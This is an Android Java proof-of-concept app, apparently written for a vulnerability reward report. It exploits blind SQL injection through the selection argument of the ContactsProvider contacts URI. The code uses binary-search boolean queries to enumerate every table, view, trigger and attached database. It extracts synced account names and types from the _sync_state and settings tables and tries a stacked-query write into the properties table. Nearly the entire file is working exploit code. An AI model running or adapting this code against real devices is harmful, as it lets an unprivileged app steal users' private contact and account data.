package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class CrossTableSqliActivity extends Activity {
    private static final String TAG = "CrossTableSQLi";
    private static final Uri CONTACTS_URI = Uri.parse("content://com.android.contacts/contacts");
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("Cross-Table SQLi via ContactsProvider\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private int queryCount(String selection) {
        try {
            Cursor c = getContentResolver().query(CONTACTS_URI, new String[]{"_id"}, selection, null, null);
            if (c != null) {
                int count = c.getCount();
                c.close();
                return count;
            }
        } catch (Exception e) {
            return -1;
        }
        return -1;
    }

    private void runTests() {
        // Step 1: Full table enumeration — extract ALL table names
        log("=== Step 1: Complete table enumeration ===");
        int tableCount = extractNumber("(SELECT count(*) FROM sqlite_master WHERE type='table')");
        log("Total tables: " + tableCount);

        for (int i = 0; i < tableCount; i++) {
            String tbl = extractString(
                "(SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET " + i + ")", 60);
            int rowCount = -1;
            try {
                rowCount = extractNumber("(SELECT count(*) FROM \"" + tbl + "\")");
            } catch (Exception ignored) {}
            log("  [" + i + "] " + tbl + " (" + rowCount + " rows)");
        }

        // Step 2: Check for call_log or calls table
        log("\n=== Step 2: Search for call-related tables ===");
        int callsExist = queryCount("(SELECT count(*) FROM sqlite_master WHERE name LIKE '%call%') > 0");
        log("Tables with 'call' in name: " + (callsExist > 0 ? "YES" : "NO"));

        int logsExist = queryCount("(SELECT count(*) FROM sqlite_master WHERE name LIKE '%log%') > 0");
        log("Tables with 'log' in name: " + (logsExist > 0 ? "YES" : "NO"));

        // Step 3: Check for views
        log("\n=== Step 3: View enumeration ===");
        int viewCount = extractNumber("(SELECT count(*) FROM sqlite_master WHERE type='view')");
        log("Total views: " + viewCount);
        for (int i = 0; i < Math.min(viewCount, 15); i++) {
            String view = extractString(
                "(SELECT name FROM sqlite_master WHERE type='view' ORDER BY name LIMIT 1 OFFSET " + i + ")", 60);
            log("  view[" + i + "]: " + view);
        }

        // Step 4: Extract sensitive data from discovered tables
        log("\n=== Step 4: Sensitive data extraction ===");

        // Extract from _sync_state - sync tokens
        log("--- _sync_state ---");
        int syncRows = extractNumber("(SELECT count(*) FROM _sync_state)");
        log("Sync state rows: " + syncRows);
        for (int i = 0; i < Math.min(syncRows, 3); i++) {
            String acctName = extractString(
                "(SELECT account_name FROM _sync_state LIMIT 1 OFFSET " + i + ")", 60);
            String acctType = extractString(
                "(SELECT account_type FROM _sync_state LIMIT 1 OFFSET " + i + ")", 60);
            log("  " + acctName + " (" + acctType + ")");
        }

        // Extract from deleted_contacts
        log("--- deleted_contacts ---");
        int delCount = extractNumber("(SELECT count(*) FROM deleted_contacts)");
        log("Deleted contacts: " + delCount);

        // Extract from settings table (contacts settings)
        log("--- settings (contacts) ---");
        int settingsCount = extractNumber("(SELECT count(*) FROM settings)");
        log("Settings rows: " + settingsCount);
        for (int i = 0; i < Math.min(settingsCount, 5); i++) {
            String acct = extractString(
                "(SELECT account_name FROM settings LIMIT 1 OFFSET " + i + ")", 60);
            log("  setting account: " + acct);
        }

        // Extract from photo_files
        log("--- photo_files ---");
        int photoCount = extractNumber("(SELECT count(*) FROM photo_files)");
        log("Photo files: " + photoCount);

        // Step 5: Extract internal metadata
        log("\n=== Step 5: Internal metadata ===");
        // SQLite version
        String sqliteVer = extractString("(SELECT sqlite_version())", 20);
        log("SQLite version: " + sqliteVer);

        // Database file path (if accessible)
        log("--- Trigger enumeration ---");
        int trigCount = extractNumber("(SELECT count(*) FROM sqlite_master WHERE type='trigger')");
        log("Triggers: " + trigCount);
        for (int i = 0; i < Math.min(trigCount, 10); i++) {
            String trigger = extractString(
                "(SELECT name FROM sqlite_master WHERE type='trigger' LIMIT 1 OFFSET " + i + ")", 80);
            log("  trigger[" + i + "]: " + trigger);
        }

        // Index enumeration
        log("--- Index enumeration ---");
        int idxCount = extractNumber("(SELECT count(*) FROM sqlite_master WHERE type='index')");
        log("Indexes: " + idxCount);

        // Step 6: Try attached databases
        log("\n=== Step 6: Attached databases ===");
        int dbCount = extractNumber("(SELECT count(*) FROM pragma_database_list)");
        log("Attached databases: " + dbCount);
        for (int i = 0; i < Math.min(dbCount, 5); i++) {
            String dbName = extractString(
                "(SELECT name FROM pragma_database_list LIMIT 1 OFFSET " + i + ")", 60);
            String dbFile = extractString(
                "(SELECT file FROM pragma_database_list LIMIT 1 OFFSET " + i + ")", 120);
            log("  db[" + i + "]: " + dbName + " -> " + dbFile);
        }

        // Step 7: Try to find cross-database data
        // If profile database is attached, it might have call log
        log("\n=== Step 7: Cross-database probing ===");
        // Try to read from profile schema if attached
        int profileTables = extractNumber("(SELECT count(*) FROM pragma_database_list WHERE name='profile')");
        log("Profile db attached: " + (profileTables > 0));

        // Check if we can read from an alternative schema
        for (String schema : new String[]{"profile", "temp", "main"}) {
            int tblCt = queryCount("(SELECT count(*) FROM " + schema + ".sqlite_master) >= 0");
            if (tblCt >= 0) {
                int ct = extractNumber("(SELECT count(*) FROM " + schema + ".sqlite_master)");
                log("Schema '" + schema + "': " + ct + " objects");
            } else {
                log("Schema '" + schema + "': inaccessible");
            }
        }

        // Step 8: Write operation test via SQLi
        log("\n=== Step 8: Write via SQLi ===");
        // Try to use REPLACE/INSERT via subquery in WHERE
        // This shouldn't work since we're in a SELECT context, but worth testing
        int writeTest = queryCount("1=1; INSERT INTO properties (property_key, property_value) VALUES ('test_write', 'vuln')--");
        log("Stacked query write: " + (writeTest >= 0 ? "query ran" : "blocked"));

        // Verify no write happened
        int propHasTest = queryCount("(SELECT count(*) FROM properties WHERE property_key='test_write') > 0");
        log("Write actually happened: " + (propHasTest > 0 ? "YES - VULN!" : "NO"));

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private int extractNumber(String subquery) {
        int lo = 0, hi = 100;
        while (queryCount(subquery + " > " + hi) > 0) {
            hi *= 2;
            if (hi > 100000) return -1;
        }
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int result = queryCount(subquery + " > " + mid);
            if (result > 0) lo = mid + 1;
            else if (result == 0) hi = mid;
            else return -1;
        }
        return lo;
    }

    private String extractString(String subquery, int maxLen) {
        StringBuilder result = new StringBuilder();
        for (int pos = 1; pos <= maxLen; pos++) {
            int charCode = extractCharCode(subquery, pos);
            if (charCode <= 0) break;
            result.append((char) charCode);
        }
        return result.toString();
    }

    private int extractCharCode(String subquery, int pos) {
        if (queryCount("length(" + subquery + ") >= " + pos) <= 0) return -1;
        String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";
        int lo = 0, hi = 127;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int result = queryCount(expr + " > " + mid);
            if (result > 0) lo = mid + 1;
            else if (result == 0) hi = mid;
            else return -1;
        }
        return lo;
    }
}
